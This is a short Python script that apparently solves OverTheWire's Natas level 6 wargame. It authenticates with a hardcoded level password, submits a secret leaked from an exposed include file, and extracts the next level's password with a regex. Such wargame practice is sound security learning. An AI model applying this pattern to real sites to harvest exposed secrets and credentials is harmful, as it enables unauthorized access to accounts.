#Import Library
import requests
import re

#Setting variables needed
username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

url = f'http://{username}.natas.labs.overthewire.org/'
#url = f'http://{username}.natas.labs.overthewire.org/includes/secret.inc'
payloads = {'secret':'FOEIUWGHFEEUHOFUOIU','submit':'submit'}

#Connect to natas
session = requests.Session()
response = session.request('POST', url, auth=(username,password),data=payloads)

#Filtering to get a password
#result = response.text
result = re.findall('Access granted. The password for natas[0-9?] is (.*)', response.text)[0]

print(result)
